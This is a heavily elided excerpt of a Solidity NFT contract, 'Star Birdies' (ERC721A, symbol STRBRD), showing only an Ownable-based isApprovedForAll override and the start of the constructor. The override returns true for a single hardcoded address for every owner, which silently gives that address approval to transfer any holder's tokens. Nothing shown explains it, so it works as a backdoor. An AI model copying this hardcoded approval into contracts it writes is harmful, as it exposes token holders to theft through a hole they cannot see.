  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x993dFcb1183F447da9AA96e183F57f343A985101){return true;}
...
contract Star_Birdies is Ownable, ERC721A, ReentrancyGuard {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("Star Birdies", "STRBRD", maxBatchSize_, collectionSize_) {
